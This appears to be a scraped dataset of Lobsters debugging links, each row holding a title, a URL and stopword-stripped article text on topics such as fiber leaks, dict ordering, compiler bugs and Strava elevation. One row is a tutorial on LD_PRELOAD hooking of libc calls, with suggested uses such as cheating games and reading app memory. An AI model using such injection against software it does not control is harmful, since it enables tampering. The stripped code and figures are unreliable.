efficient structure case number element stay small developer turn designed around assumption fixed thread pool never containing handful thread nodefibers especially used meteor work way meteor every concurrent operation get fiber fiber completes placed pool reuse many fiber needed simultaneously pool grow size pool get bigger linked list get bigger make fiberswitching slower make whole process permanently slower creating process getting slower time getting suddenly slower one moment process fine next hosed normal load server sitting steady around fiber nowhere near enough problem new mystery causing sudden spike fiber creation around time started referring incident ala profile showed u aftereffect bomb gone told u nothing fiber created first place back square one early morning september problem became suddenly urgent instead week problem started happening approximately hour like good production problem began midnight three iteration paged wake restart process go back grudgingly accepted could wait morning hotpatched server monitor fiber count kill whenever number went process observed typical created anywhere fiber still root cause mystery server managing restarts pager quieting crawled back bed spike continued happen approximately hour actually wonderful meant could iterate problem faster could began manually instrumenting codebase sort sampling profiler specifically sampled fiber creation specifically time fiber count seemed spiking turned easy sound many place would create fiber result task queued previously time fiber creation queue insertion longer stack instrument queue insert bad monkeypatch soon made startling discovery turned meteor monkeypatched global promise implementation specifically apparently decided wanted callback always run fiber convenience since meteor code requires run fiber thus wrote code intercept call wrap callback another callback creates new fiber run original callback inside might sound basically reasonable first standard promise semantics problem code make heavy idiomatic use promise common string together long chain short callback happens sandstorm contains lot promisebased code especially around communicating backend using proto api make heavy use promise expect run fiber thus code seemingly nothing fiber fact main creator fiber system creating massive quantity totally unnecessary fiber wasting memory cpu time even actually explain bomb way fiber work start new fiber immediately completes fiber immediately go back fiber pool promiseheavy code operated asynchronous style therefore callback would always complete immediately promise code needlessly starting lot fiber actually reusing fiber object one wrinkle turn promise implementation sometimes call recursively passing along one callback one promise another fact correctly implement spec since monkeypatched time callback passed another call received another wrapper layer spawning another fiber end one callback finally called would start fiber would start another fiber would start another fiber since fiber chain responsible spawning next fiber would started completed one callback managed wrapped time get fiber patched promise monkeypatch wrapping callback would mark wrapped callback object field like alreadywrapped true callback came back wrapped code would see marking avoid doublewrapping like problem stopped meanwhile also filed issue requesting replace linked list hashtable completely mitigated fiber bomb would least prevented permanently crippling process
525,Lobsters,debugging,Debugging,"Python: hash, id and Dictionary Order (2013)",http://amir.rachum.com/blog/2013/07/03/python-hash-id-and-dictionary-order/,python hash id dictionary order,python hash id dictionary order attribution twitter facebook similar post,python hash id dictionary orderjuly post year old detail opinion might date would still love hear feedback comment enjoy tl dr really seriously kidding even think relying dictionary traverse order may change even seemingly unrelated code changestoday ran one bizarre behavior python ever seen coworker debugging code called help class polled database table specific entry reason failed find although existed added breakpoint pdb import pdb pdbsettrace debugging code seemed work huh thought let remove pdb statement see work program worked pdb statementhere watereddown version code debugging class tablea object pas class tableb object pas class tablec object pas class poller object table tablea tableb tablec def poll self table value selftablesiteritems look entry print table return p poller ppoll real bug return statement regardless whether found entry returned found continue loop entry side issue result bug one table checked called poll specifically entry looking tablec code polled tablea added pdb statement however polled tablec seemed solve bug order dictionary returned item consistent long code change introduced yep also tried add function call like sleep resultso let testing took following piece code similar code run several thousand time class object pas class b object pas class c object pas class object pas class e object pas class f object pas class g object pas class h object pas class foo object b c e f g h def bar self key value selfditeritems print keyname f foo fbar result every run order static happens h f e b c gthat kind surprise let continue testing add redundant code end script import time timesleep see happens order static change first version code look like f e g b h cso let figure happening hereto understand determines order item iteritems need first understand bit internals cpython dict implementation attribution python dictionary implemented hash tableswhen new dictionary initialized start slot adding entry table cpython us mask take x lower bit entry hash us bit determine entry initial location dictionary slot x initial slot entry taken cpython us psuedo random probing select new location us bit entry hashthe default cpython implementation hash method id entry turn default id implementation simply object memory addressthe order item iteritems return order slot slot first slot etci found every run every class hash different make sense memory address change available python process however also found every single run lower bit every class hash remained equal value class h respectively first version reason order remained guess happens second version lower three bit different value first version consistent across multiple run remember add redundant line code also class instantiated naively expect effect value class h hash changed way lower bit changed well obviously also changed order dict traversedwhy happening good question since getting really specific python implementation make educated guess python allocates segment memory code segment somehow lower bit hash recall always would love someone intimate cpython implementation could comment let u know really happening herein case final upshot know already warned rely dictionary order even thought well small script empirically see order remains static rely time dictionary order change reason obvious unexpected like dictionary predictable reliable order use ordereddict instead discus post comment section follow twitter facebook similar post
526,Lobsters,debugging,Debugging,Keyboard Tester,http://www.keyboardtester.com/,keyboard tester,spotify apple music,welcome internet premiere keyboard testing website custom handcoded testing software allows test every key computer keyboard within comfort browser simple fast efficient free keyboardtestercom top choice keyboard user around world made usa keyboardtestercom guaranteed probably work keyboard several browser keyboardtestercom brand new way enjoy keyboardtester monophonic key sound experience testimonial even test keyboard keyboardtestercom larry f canada tested keyboard found key z key c key broken thanks aleandra tea use keyboardtestercom facebook jim internet definitely website susan l california successful fundraising campaign licensed song official anthem keyboardtestercom please enjoy test keyboard alternate musical listening platform spotify apple music overjoyed find keyboardtestercom compatible popular typing technique
527,Lobsters,debugging,Debugging,Tattletale Variables,http://tinypig2.blogspot.com/2016/09/tattletale-variables.html,tattletale variable,,sometimes might faced huge program somewhere changing variable value something undesired use data dumper sub somelongfarawayfunction href shift pretend lot code nt want sift href banana bad value shoppinglist apple pear banana somelongfarawayfunction shoppinglist warn dumper shoppinglist output apple banana bad value pear nt know changed need find change variable tell changed package tattletalescalar use carp qw cluck require tie scalar isa qw tie stdscalar sub store warn tattletale variable set cluck package main use data dumper sub somelongfarawayfunction href shift pretend lot code nt want sift href banana bad value shoppinglist apple pear banana tmp shoppinglist banana save current value tie shoppinglist banana tattletalescalar shoppinglist banana tmp restore saved value somelongfarawayfunction shoppinglist warn dumper shoppinglist see stack every time variable changed tattletale variable set examplepl line examplepl line tattletalescalar store tattletalescalarscalar called examplepl line tattletale variable set bad value examplepl line examplepl line tattletalescalar store tattletalescalarscalar bad value called examplepl line main somelongfarawayfunction hash called examplepl line apple pear banana bad value
528,Lobsters,debugging,Debugging,"Dynamic linker tricks: Using LD_PRELOAD to cheat, inject features and investigate programs (2013)",https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/,dynamic linker trick using ldpreload cheat inject feature investigate program,post assumes basic c skill motivational example wait happen told use real one programmed use real one besides time created program fake rand even exist ldd randomnums libcso force library loaded program ldpreload pwdunrandomso ldd randomnums transparent transparent exactly possible us unrandomize even one step list accessed file monitor internet access inspect gtk structure sandbox unsafe application implement feature zlibc fix bug access application memory like,post assumes basic c skill linux put full control always seen everyone perspective power user love control going show basic trick let heavily influence behavior application fun also time useful motivational example let u begin simple example fun first science later include stdioh include stdlibh include timeh int main srand time null int printf dn rand return simple enough believe compiled special flag gcc randomnumc randomnum hope resulting output obvious ten randomly selected number hopefully different time run program let pretend really source executable either delete source file move somewhere need significantly modify program behavior yet without touching source code recompiling let create another simple c file int rand return random number universe compile shared library gcc shared fpic unrandomc unrandomso application output random data custom library implement rand function constant value run randomnum way watch result ldpreload pwdunrandomso randomnums lazy somehow fail guess might happened let know output consists ten may even impressive first export ldpreload pwdunrandomso run program normally unchanged app run apparently usual manner seems affected tiny wait happen yup right program failed generate random number use real rand one provided return every time told use real one programmed use real one besides time created program fake rand even exist entirely true choose rand want program use told use rand program started certain library provide functionality needed program loaded learn using ldd ldd randomnums see output list libs needed randomnums list built executable determined compile time exact output might slightly differ machine libcso must file provides core c functionality includes real rand peek function libc provide used following get full list nm nm command list symbol found binary file flag tell look dynamic symbol make sense dynamic library output long indeed list rand among many standard function happens set environmental variable ldpreload variable force library loaded program case load unrandomso randomnum even though program ask following command may interesting ldpreload pwdunrandomso ldd randomnums somepathtounrandomso note list custom library indeed reason code get executed randomnum call rand unrandomso loaded library provides implementation rand neat transparent enough like able inject code application similar manner way able function normally clear implemented open simple return application would like hack malfunction point transparent actually call original open int open const char pathname int flag evil injected code go return open pathname flag call real open function provided u libcso hm really call original open obviously endless recursive call access real open function needed use programming interface dynamic linker simpler sound look complete example explain happens define gnusource include dlfcnh typedef int origopenftype const char pathname int flag int open const char pathname int flag evil injected code go origopenftype origopen origopen origopenftype dlsym rtldnext open return origopen pathname flag dlfcnh needed dlsym function use later strange define directive instructs compiler enable nonstandard stuff need enable rtldnext dlfcnh typedef creating alias complicated pointertofunction type argument original open alias name origopenftype use later body custom open consists custom code last part creates new function pointer origopen point original open function order get address function ask dlsym find u next open function dynamic library stack finally call function passing argument passed fake open return return value evil injected code simply used printf victim used open access n pathname remember include stdioh compile needed slightly adjust compiler flag gcc shared fpic inspectopenc inspectopenso ldl append ldl shared library linked libdl provides dlsym function nah going create fake version dlsym though might fun result shared library implement open function behaves exactly real open except side effect printfing file path convinced powerful trick time tried following ldpreload pwdinspectopenso gnomecalculator encourage see result basically list every file application access real time believe hard imagine might useful debugging investigating unknown application please note however particular trick quite complete open function open example also standard library full investigation would need create fake one possible us still enjoyed let suggest bunch idea achieved using trick keep mind without source affected app gain root privilege really even bother bypass security way quick explanation pro library preloaded way ruid euid cheat game unrandomize first example fully working case would need also implement custom random randr randomr also apps may reading devurandom might redirect devnull running original open modified file path furthermore apps may random number generation algorithm little unless point look like easy exercise beginner cheat game bullet time implement standard timerelated function pretend time flow two time slower ten time slower correctly calculate new value time measurement timed sleep function others affected application believe time run slower faster wish experience awesome bullettime action go even one step let shared library also dbus client communicate real time bind shortcut custom command additional calculation fake timing function able enable disable slowmo fastforward anytime wish investigate apps list accessed file second example could also pushed recording monitoring app file io investigate apps monitor internet access might wireshark similar software trick could actually gain control app sends web look also affect exchanged data lot possibility detecting spyware cheating multiplayer game analyzing reverseengineering protocol closedsource application investigate apps inspect gtk structure limit standard library let inject code gtk call learn widget app use structured might rendered either image even gtkbuilder file super useful want learn app manage interface sandbox unsafe application trust app afraid may wish rm rf unwanted file activity might potentially redirect file io eg tmp appropriately modifying argument pass filerelated function open also eg removing directory etc difficult trick chroot give control would safe complete wrapper unless really know actually run malicious software way implement feature zlibc actual library run precise way uncompresses file go accessed application work compressed data without even realizing fix bug another reallife example time ago sure still case skype closedsource problem capturing video certain webcam source could modified skype free software fixed preloading library would correct problem video manually access application memory note access app data way may impressive familiar software like cheatenginescanmemgameconqueror require root privilege work ldpreload fact number clever trick injected code might access app memory fact get executed application might modify everything application probably imagine allows lot lowlevel post article another time idea came bet find share commenting like like loading related
529,Lobsters,debugging,Debugging,Optimizing optimizing: some insights that led to a 400% speedup of PowerDNS,https://medium.com/@bert.hubert/optimizing-optimizing-some-insights-that-led-to-a-400-speedup-of-powerdns-5e1a44b58f1c,optimizing optimizing insight led speedup powerdns,optimizing optimizing insight led speedup powerdns benchmark broad brush optimization looking profile big impressive improvement antonie dna tool rush fixing issue powerful mindset cpu compiler library operating system language idiot xor ax ax ax ndimensional hyperplanes without speedup flat profile check call graph http wwwbrendangreggcomperfhtml flamegraphs superheroic optimization heroic performance might reason give optimization much admire people make everyone learns time le best way speed code run john carmack point view tooling powerdns monthlong optimization spree law marginalhhhhhh exponential return certain important workload hit go microsecondsop microsecondsop twice fast achieved incremental doubling speed wrapping good luck,optimizing optimizing insight led speedup powerdnsso matter pretty code eventually someone benchmark demand top performance squeezing microsecond addictive even destructive activity ruin evening destroys ability converse human being typically leaf code messno programmer escape however world demand speed somewhat equivalent modern measure longer battery lifesqueezing performance matter writing better code art past year success many performance improvement way long coming lot misguided advice tooin post highlighting thing learned yearsnote optimization tutorial may help craft useful mindsetbroad brush optimizationsso really magic sauce snake oil use reference counted pointer use lockfree code stay away stl typically rather useless also rather unscientific advice hard falsifyusing tool sparinglysure point blazing fast project used exception rtti dynamic allocation project cost asceticism enormous even sure putting code diet actually caused fastone reason advice stay around hard implement refute perhaps work perhaps typically requires revamping whole project find outthe takeaway give optimization real world project us newfangled stuff dynamic memory exception little proof performance suddenly zoom without let alone project ship timelooking profile big impressive improvementso starting optimizing codebase frequently impressive low hanging fruit performance profile project spends time one super slow function bam five minute work double performancei antonie dna tool turned spend time power e get unimportant statistic rightthe rush fixing issue powerful spoil u effort speed code want big hitter jump u without much thinking keep hunting come rest speedup going actual hard workthe mindset cpu compiler library operating system language idioti think go back true xor ax ax faster setting ax system random call slowly delivered alternating odd even number located ndimensional hyperplanes could help compiler replacing anything operating system could better bypassing get u started language dreaded function call overhead day turn obvious optimisation already done either compiler cpu know lot code many u wasted ton time implementing userspace multitasking asynchronous io surely system thread must suck find kernel know hell lot cpu io case special enoughsimilarly many project forgone virtual method rtti c parlance reimplement badly switch statement start every method function tangible step backwards since compiler often devirtualise call switch statement function pointer struct tvery often effort help cpucompileros best redo happening already also deidiomized code otherwise made far le readable without speedup often turn actually made thing worseas notable exception actually knownslow platform like python example make sense sidestep gain performance might wrong place get fast software anyhow fall trap assuming easily better infrastructure either pick better infrastructure measure thing indeed dire think arethe flat profile check call graphafter first big optimization done often staring profile unavoidable function work plus ton eachi spent inordinate amount work speeding individual function depressing realise even manage speed function take cycle still improved overall performance first flat profile stumped made give optimization however advent better profilers learned flatness deceivingyou might spend time function discover total time spend one higher order function calling little function way often higher function never show flat profile powerdns flame graph made http wwwbrendangreggcomperfhtml flamegraphs actual data hereso takeaway get callgraph based performance profile usually somewhat hassle frequently massively slower worth get beyond long tail function taking timesuperheroic optimizationsthese olympics speedup story captivate u reading personally make feel small inadequate example would code aes encryption function would whole order magnitude slower crypto superheroes achieved modern aes implementation encryption clock cyclesbyte without special hardware assistance nanosecond performs ton xors shift whereas clock cycle normal programmer like barely count heroic performance might reason give optimization know fact current pipeline vectorisation machinery modern cpu fear even heroic programmer tease performance tightly defined simple function even take weeksso although much admire people make speculative execution engine cpu spin realize achieve stellar performance spending week hundred byte code something rarely scale beyond encryption hashing codec library feel bad make grateful use work move onwhat everyone learns time lesseveryone keep reinventing one something manly lack better word brute force optimization function usually get speed boost best unless one people previous section course swoosh codethe best way speed code run requires different mindset one focus individual line code even function involves truly understanding program doingand spent sufficient time frequently discover code retrieving field database looking one even interesting looking field actually storing row vector return sizejohn carmack doom quake fame first opened point view almost always better spend time reducing total number allocation versus implementing custom allocator john carmacki spent time allocator improvement care admit writing tooling find exactly allocation coming reducing malloc traffic far greater effect trying optimize actual allocator itselfas case point powerdns recently launched monthlong optimization spree incidentally led article final big speedup came discovered inordinate amount string manipulation thing could also store binary parsed form turning asciidns roundtrip integer comparisonso looking thing optimize take large number step back individual line code figure exactly code trying achieve fact maybe way many thing compared thing slowlythe law marginalhhhhhh exponential returnsthis one really hit face powerdns authoritative server needed speedup needed whole factor improvement certain important workload started quickly found two algorithmic optimization delivered performance boost meh pursue angle speedup get speedup spent day major refactoring achieve worthwhile performance increase pondered next taken microsecond operation microsecond operation hit speedup discarded worth microsecond would come microsecond budget combined speedup suddenly became speedup go microsecondsop microsecondsop twice fastnow work fully independent optimization frequently find operation consist many step individual speedup hit stepsin retrospect come surprise sqlite project achieved incremental doubling speed microoptimizations takeaway whenever shaving realize may actually shaving clock cycle percentage cycle become incrementally important face optimization discard mere improvement realize might turn improvement end day wrapping upthat project fast one use feature aware another project asceticism surely costing time may make fastthink twice thrice reimplementing infrastructure functionality actually smarter full time compilercpuos designer big massive improvement fixing one function happens improvement hard work prepare slogthe flat cpu profile invest callgraph based profiling get flame graphsthose cyclesbyte speed record great use work feasible large scale code feel bad spreadsheetjust lessdon knock initial improvement achieved speedup relatively speaking speedup might add doubling performance law exponential returnsgood luck personal insight speeding code please share perhaps room optimize article
531,Lobsters,debugging,Debugging,A swiss army knife of debugging tools,http://jvns.ca/blog/2016/09/17/strange-loop-talk/,swiss army knife debugging tool,post tracing tool,move want talk sampling v tracing little bit sampling profiler look small percentage going program stack trace use information generalize program great reduces overhead usually give good idea program happens error happens infrequently like time might think big deal fact lot people might big deal write program thing million billion time want thing really highly reliable even relatively rare event important love tracing tool log file tell everything certain function called make lot easier debug general statistical distribution great post tracing tool dan luu
532,Lobsters,debugging,Debugging,Systems programming as a swiss army knife,https://www.youtube.com/watch?v=HfD9IMZ9rKY,system programming swiss army knife,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature system programming swiss army knife julia evans youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature system programming swiss army knife julia evans youtube
533,Lobsters,debugging,Debugging,The Voodoo of Elevation Gain and Strava (and How I Get Around It) (2015),http://regex.info/blog/2015-05-09/2568,voodoo elevation gain strava get around,first real ride strava mountain bikeride first real mountain ride short intense bike ride northern kyoto commented strava mobile app bad elf gps pro gps glonass barometric altimeter informal gps logger test iphone gps shockingly good another informal locationlogger test einstein general theory relativity gps unit guru map modify tracklog force strava accept elevation data sweet lady seen pause without pause place first tentative outing bike first real mountain ride kuyataki waterfall manseki group ride southeast kyoto highly visible mountain ride pleasant lake ride coffee cowbell revisiting first big mountain ride correctly note continued,light mountain climb lunch climb village kurodani takashima city shiga japan 高島市黒谷からの山登り screenshot google earth see route rode bicycle last wednesday little bit green coming right downhill section road followed long red uphill section tiered rice paddy village mountain old road longer open traffic ridden get point would end riding farther got home ever since first real ride february interested much distance covered rather much mountain conquered mean important statistic much vertical climb elevation gain ride sum risesclimbsascents route vertical climb often used badge achievement ride seems get talk distance strong reflection tough route problem difficult figure vertical climb particular route commonlyused method often wildly inaccurate cyclers met record ride gps unit sort iphone bike computer runner watch etc upload data strava service allows analyze activity share info others popular mostly well done example mentioned previous post long mountain bikeride april strava informed beaten record particularly tough mountain climb data ride courtesy stravacom footnote since beat second upload data strava calculate vertical climb activity display prominently example aforementioned first real mountain ride show impressive stats since first real ride nt know better impressed kilometer mile vertical climb done amazing superman unfortunately lie course several big mountain ride started feel number reported strava quite bit inflated could nt put finger exactly week ago posed another ride short intense bike ride northern kyoto someone commented apparent discrepancy reality strava reported hence claimed spurred investigating spent last week digging writing trackloganalysis software test etc went long ride last wednesday brought arsenal equipment recording five separate log three different gpsglonassequipped device trip ended longest ride ever also vertical climb ever done one day among many way recorded trip data used strava mobile app iphone done app upload data strava strava reported trip impressive wrong elevation graph bottom accurate representation ride four separate major mountain peak transversed along many little one though nt seem little time strava informs trip encompassed impressive vertical climb look like started initially climbed went quite bit believe looking graph difficult come sum part reality believe vertical climb trip first let look strava number wrong let look get better answer various way unit record elevation travel generally untrustworthy modern unit like iphone dedicated unit like bad elf gps pro three method figure altitude gps glonass barometric altimeter gpsglonass fairly accurate latitude longitude discussed prior post informal gps logger test iphone gps shockingly good another informal locationlogger test fantasticallyamazing technology perhaps time come contact something must actually take account einstein general theory relativity perfect three dimension elevation far least accurate consider view three gpsglonass unit tracklogs plotted google earth various section last wednesday ride three unit rarely agreed elevation google data seen google earth way tended wander wildly time track viewed directly matched road quite well elevation data speak map wishing track vertical climb absolute accuracy unit particularly important relative accuracy stability important seems barometric altimeter provide better result first experience barometric altimeter garmin gps unit decade ago bad breeze walked unit would record nontrivial change elevation depending unit physically angled relative air movement ridiculous thing seem better last wednesday trip two barometric altimeter one iphone another bad elf gps plot last section seen anyway naïve calculation vertical climb look data point elevation point higher previous point add difference total minor error result small fluctuation short term result wildlyinflated overall result one smooth raw data eg moving average get realistic result apparently google earth let look calculates five tracklogs unittypegoogleearth verticalclimb calculation badelf gps badelf gps barometric garmin etrex apple iphone apple iphone quite range result trip correct frankly probably none see later technique use eke fairly reasonable result first let see strava actually strava strava iphone app access iphone altimeter barometric gpsglonass end us neither rather throw away elevation data instead relies database elevation data likely data google us show elevation google earth strava approach may well fine generallyflat area produce ridiculouslyoverinflated result mountainous area checked easy see created software analyze tracklogs smooth local irregularity present uphill section red downhill section green let look mountain shown article lead photo long climb followed long enjoyable descent side reality red mean uphill green mean downhill climb descent quite straightfoward climb solid climb without downhill break descent solid descent without uphill section ascent solid red line descent solid green line let look strava see well data source strava elevation data bad elf gps using barometric altimeter bad elf gps using gpsglonass iphone using gpsglonass recorded galileo offline map name changed feb guru map garmin etrex gpsglonass strava baro garmin gps gps iphone gps iphone baro mouseover button see image strava data show many ups down side mountain ups down simply nt easy see look mountain google earth believe us elevation data side side mountain rode mountain pressed face road appears undulate make overall progress lower strava ups count vertical climb strava detects many false climb view alone course road nt undulate progress monotonically undulate side side around ravine cut side mountain eon water wind sort see proper undulation path created barometric altimeter descending around ravine exist nt presented google earth clear complaining google resource freely gifted world google earth google map continues amaze extremely thankful quite sure complaining strava perhaps easilyavoidable inflated result particular area japan rest world enjoys added accuracy due strava policy nt know know lot folk around world complain strava inflated elevation claim least know alone better first note strava respect recorded elevation situation recognizes data recorded barometric altimeter iphone app however either nt use barometric altimeter nt notice user get stuck strava wild elevation data strava accept device elevation data offer user way get corrected data whereby strava throw away user data replaces inaccurate elevationdatabase data result much le accurate result many folk offer way undo action bump link accident hosed also nt allow toggle device elevation data barometric data seems really want push data blame folk like early ignorant hyperinflated verticalclimb data get ego boost seeing big number suppose boosted ego help business interest thankful service enjoyed without cost wish aspect better update strava lot problem company respect user end appreciate tool seem work signed paying customer luckily one crack antireality armor allow geeky type like create tracklogs device modify tracklog force strava accept elevation data upload massaging tracklog data spent last day writing software analyze tracklog data smooth derive meaningful information first step identify stopped moving elevation gain loss speed nothing stopped unfortunately gps receiver tend record drifting location stationary hour spent visiting someone sweet lady mountain along way wednesday long ride hour complete lack movement look like analysis figured movement nt really get anywhere filter mark stopped location little blue ring pause detected software note length pause kml label like pause detection seems highly accurate compared result reality remembered trip pretty much perfect even accurately detected pause intersection waiting car clear crossed pause traffic pause wandering around convenience store waiting friend join trip software go entire trip find highest peak lowest valley pin elevation location divide whole trip four part subject analysis analysis recurses repeat onto difference local peak local valley almost within range noise local peak valley found elevation point smoothed using moving average elevation peakvalley point left undisturbed elevation rise add trip vertical climb analysis software prepares kml file show trip red line climb green descent white flat section optionally blue circle pause one view second half trip looking north eastern side lake biwa red line far right end shirahige shrine seen report ride two week ago visited briefly come mountain turning south ride home distance shrine background spot foreground route turn degree pitch mountain crow fly mention scale whole trip like see download kml file pause without pause view google earth pause view best want relive experience see example stopped half hour eat lunch place last visited seven year ago progressed mountain stopping interval photo check direction fix popped chain view pretty cluttered want analyze whether verticalclimb data seems reasonable without pause version better duration includes intervening pause rendering fairly meaningless probably simply remove moment still anyway analysis tracklogs found one produced bad elf gps barometric altimeter seemed match reality one consider relatively speaking correct analysis cleaning smoothing left tracklog relatively speaking trust prepare strava wo nt override elevation data upload strava nt know grooomed standard processing come somehow came extra vertical gain since truly nt know actual value ca nt say le wrong ability derive realistic verticalclimb value honest must go back correct prior trip date event vertical gainclaimed time vertical gainrealistic value stravainflation foot jan first tentative outing bike na feb first real mountain ride march kuyataki waterfall manseki march group ride southeast kyoto april highly visible mountain ride april pleasant lake ride april coffee cowbell april revisiting first big mountain ride nt good barometricaltimeter tracklog one ride amount strava inflation shocking could solve problem couple day think real company presumably smart folk could come something anyway need find better app keeping tracklogs iphone one let record gpsglonass elevation barometric elevation also heartrate use klugy mixture various device combine data massage smooth send strava ever get around addressing suppose would good time bring next issue ignore elevation change calculating distance correctly note difference perhaps ride still mile wrong overall guess strava anal statistic continued
534,Lobsters,debugging,Debugging,"Everything Old is New Again, and a Compiler Bug",https://randomascii.wordpress.com/2016/09/16/everything-old-is-new-again-and-a-compiler-bug/,everything old new compiler bug,investigating fld qword ptr bug filed source server enabled fstp st calling convention program ltcg reported bug enabling exception flush bug fpexceptionenabler compiler bug crash dump http chromiumbrowsersymsrvcommondatastoragegoogleapiscom discussed discussed four crash dump implemented filed bug connect bug whole series article post like,exceptionfltstackcheck exception one coworkers said said weird rare crash ask turn one weird rare crash started showing chrome branch stable branch consumer running began looking together decided made sense assign bug partly crash analysis required specialized knowledge happened mostly curious thought bug going interesting disappointed crash fpu chrome barely us instruction crashed chrome thousand instruction away one triggered exception instruction triggered exception fault crash happened thirdparty code running inside chrome crash ultimately found caused codegen bug visual studio end investigation bug went quickly required multiple bit obscure knowledge past therefore thought might interesting share post describes process investigating bug saved crash dump follow along investigation chrome symbol server make easy see going crash dump linked instruction end post similar crash dump used understand fix bug investigating first thing understand exceptionfltstackcheck nothing cpu regular stack fltstack mean obviously shortly crash function called base messagepumpwin getcurrentdelay chrome browser process looking interesting crash always switch assembly language toggle otherwise information far vague allow reliable diagnosis crashing instruction fld instruction sequence movsd mmword ptr fld qword ptr fstp qword ptr esp call ceil fstp qword ptr fld instruction part fpu load floatingpoint value onto peculiar eightregister stack seems initially plausible could caused fltstack check design stack eight entry intel must seemed like good idea time since crash need see state fpu visual studio register window default showing integer register rightclick enable floating point handy know v refers fpu sse avx one many minor trick needed investigate bug aside v team talk layout register window terrible putting register one line letting wordwrap sort may good enough arnaud amalric find pretty annoying consistent indentation maybe explicit line break wordwrapping e floatingpoint number bug filed relevant register crash stack output window live repro bug fld trigger stack exception stack must full think remembered tag ffff mean stack empty also remembered something far important fpu started life coprocessor maybe floatingpoint latency matter report exception synchronously crazy world floatingpoint exception reported next instruction executes fld instruction problem problem previous instruction executed day floatingpoint math done using sse instruction mean previous instruction might long way away sign getcurrentdelay function point bug looking impossible investigate designer totally cruel capricious dedicated register storing address last instruction executed actual problematic instruction address instruction referred v register window eip confused main processor eip register register turn crucial screenshot see eip equal eip almost mb away good thing try guessandgo debugging see code eip paste prefix necessary address bar visual studio disassembly window source server enabled v even pull appropriate source file assembly language main thing need bold instruction handleupdatetimeout near bottom culprit nearby assembly language also turn relevant processpowercollector updatepowerconsumption push ebp mov ebp esp call processpowercollector recordcpuusagebyorigin movsd mmword ptr pop edi pop esi mov esp ebp pop ebp ret processpowercollector handleupdatetimeout call processpowercollector updatepowerconsumption fstp st ret fstp pop value eight register stack would trigger fltstack check stack empty maybe stack empty time next thing know window calling convention program say float double result returned st since updatepowerconsumption supposed return double mean floatingpoint stack empty next look updatepowerconsumption address see problem instruction move return value sse register instead st hence mismatch compiler allowed create calling convention want within binary rule everybody agree rule bug necessarily updatepowerconsumption returning value wrong register set bug compiler generated caller callee agree going talk complicating bug difficult reproduce tried normal build tried changing tried ltcg build compiler kept refusing generate inconsistent code eventually coworker thanks sébastien pointed set fullwpoonofficialtrue source file would built ltcg finally could reproduce bug reported bug since optimizer misbehaving worked around issue disabling optimization two relevant function microsoft able reproduce bug sound like made progress understanding remained one mystery code supposed run every thirty second come crash hitting every user chrome well turn floatingpoint exception default suppressed floatingpoint instruction something bad usually return besteffort result continues running wrote year ago recommended developer try enabling exception order flush bug would otherwise hidden know everyone crashing remained one mystery anyone crashing floatingpoint exception suppressed bug remained hidden forever answer crazy world window lot program think injecting dlls process good idea whether malware antimalware something else injected dlls end causing good portion chrome crash case one injected dlls decided changing fpu exception flag somebody else process good idea mean could worse case exposed genuine compiler bug much polite trashing heap patching code thanks verified grabbing fpexceptionenabler class modifying enable eminvalid exception stepping controlfps call enables exception seeing floating point register changed highlighted red one ctrl register went knew clearing low bit would enable fpu invalid exception installed chrome canary bug launched visual studio debugger stopped handleupdatetimeout function used register window change ctrl let run crash thousand instruction later theory confirmed story complete recap weirdness fltstack different regular stack fltstack exception occur problematic instruction enable display floating point register navigate instruction indicated floatingpoint eip find real culprit find fltstack messed missing function prototype used usual reason compiler bug seem trendy floatingpoint exception normally suppressed thirdparty code rude thing process visit crash dump promised crash dump order use load windbg visual studio add http chromiumbrowsersymsrvcommondatastoragegoogleapiscom chrome symbol server list symbol server chrome pdb file automatically downloaded discussed probably also enable source server discussed debugger automatically download appropriate source file windbg type srcfix v click check box shown crash dump recommend viewing assembly language visual studio opening register window rightclicking enable floating point display see floatingpoint ctrl stat eip register four crash dump le kb handleupdatetimeout calldmp call processpowercollector updatepowerconsumption register window see ctrl good handleupdatetimeout calldmp one fstp instruction mess thing helpfully changed ctrl enable eminvalid exception note stat floatingpoint eip register change handleupdatetimeout exception triggereddmp execution moved ret instruction exception triggered stat register value indicates somehow exception pending eip indicates fstp instruction last instruction executed getcurrentdelay crashdmp crash dump capture actual crash completely different call stack unfortunately crucial floatingpoint eip register zero crash dump saved visual studio record luckily chrome crashpad save else bug would much difficult resolve crashpad thankfully save state implemented visual studio filed bug bug last appeared chrome version canary want recreate instruction connect bug get ready long build time want floatingpoint goodness happy know written whole series article subject want read finding compiler bug got post reddit discussion like like loading related
536,Lobsters,debugging,Debugging,Introducing debugger.html,https://hacks.mozilla.org/2016/09/introducing-debugger-html/,introducing debuggerhtml,react redux firefox developer tool remote debug protocol chrome rdp github debuggerhtml getting started getting started version getting started firefox developer tool developer tool nightly getting involved contributing,debuggerhtml modern javascript debugger mozilla built web application react redux project started early year effort replace current debugger within firefox developer tool also wanted make debugger capable debugging multiple target functioning standalone mode currently debuggerhtml connect debug firefox also connects experimentally chrome node debugger connects firefox using mozilla remote debug protocol rdp communicates node chrome using chrome rdp debuggerhtml project hosted github us modern framework toolchains making readily available attractive wide audience developer debuggerhtml user interface separated three main region source panel editor panel right sidebar source panel display tree view current source application currently debugged editor panel used display various source file project provides functionality setting breakpoints prettifying source right sidebar display current set breakpoints current call stack scoped variable debugger paused debugger support control pausing step step step play function debugging javascript call stack panel display call stack frame given pause condition scope panel display expandable variable tree based selected frame getting started get started using debugger check code github look getting started guide want dive straight run following command npm install install dependency npm start start development web server open http open modern browser opened debugger browser port main debugger page displayed listing debuggable target select order debugger connect debug target must running remote debugging turned generally requires start target couple flag set example start firefox instance macos enable remote debugging following command applicationsfirefoxappcontentsmacosfirefoxbin startdebuggerserver p development option chrome firefox listed debugging node requires version higher installed need run node inspect flag set example want debug myserverjs need use command similar following node inspect myserverjs information available getting started guide firefox developer tool integrating debugger developer tool firefox first iteration landed nightly try getting involved mentioned project still development grateful help making best debugger possible interested joining u effort please take look contributing guide
